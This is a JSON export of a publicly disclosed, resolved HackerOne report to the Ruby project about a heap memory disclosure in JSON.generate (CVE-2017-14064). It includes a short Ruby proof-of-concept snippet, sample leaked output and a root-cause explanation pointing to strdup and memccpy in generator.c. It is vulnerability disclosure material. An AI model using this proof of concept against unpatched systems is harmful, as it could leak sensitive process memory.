{
  "id": 209949,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDk5NDk=",
  "url": "https://hackerone.com/reports/209949",
  "title": "Arbitrary heap exposure in JSON.generate",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2017-03-01T22:55:39.657Z",
  "submitted_at": "2017-03-01T22:55:39.657Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ahmadsherif",
    "url": "/ahmadsherif",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 7724,
    "url": "https://hackerone.com/ruby",
    "handle": "ruby",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Ruby",
      "twitter_handle": "",
      "website": "https://www.ruby-lang.org",
      "about": "A Programmer's Best Friend"
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2017-14064"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2017-09-25T12:32:43.247Z",
  "bug_reporter_agreed_on_going_public_at": "2017-09-25T12:32:43.206Z",
  "team_member_agreed_on_going_public_at": "2017-09-25T08:29:07.918Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Running this snippet can expose arbitrary memory:\n```ruby\nrequire 'json'\n\nstate = JSON.state.new\nstate.space = \"\\0\" * 1024\n\nputs JSON.generate({a: :b}, state)\n```\n\n```\n{\"a\":\npsych/handlers/recorder.rb\ntensi0\nreeze)\nGem::Specification.new do |s|\n  # to objects of the same type as the original delegate.\nmydata/scm/git/ruby/dist/lib/ruby/2.5.0/json/ext.rb\npass the namP\nSee http://guides.rubygems.org/specification-reference/ for help\n#     # constant and class member data initialization...\n\"b\"}\n```\n\n\nThe issues lies in using `strdup` in [generator.c](https://github.com/ruby/ruby/blob/trunk/ext/json/generator/generator.c#L1103), which will stop after encountering a NULL byte returning a pointer to zero length string, which is not the length stored in `space_len`. Eventually `fbuffer_append` will copy the length of the string (e.g. the 1024 above) into the generated buffer.\n\nSimpler snippets like `JSON.generate({foo: \"bar\"}, space: \"\\0\" * 1024` suffer the same issue but for slightly different reason; as `fstrndup` is using [memccpy](https://github.com/ruby/ruby/blob/trunk/ext/json/generator/generator.c#L311) which will, again, stop copying after encountering a NULL byte returning a pointer to zero length string.",
  "weakness": {
    "id": 2,
    "name": "Memory Corruption - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-10-25T08:29:07.956Z",
  "allow_singular_disclosure_after": -198907631.9654215,
  "singular_disclosure_allowed": true,
  "vote_count": 9,
  "voters": [
    "flamezzz",
    "bl4de",
    "apapedulimu",
    "r3y",
    "eveeez",
    "marwan",
    "japz",
    "spetr0x",
    "achnoniod"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
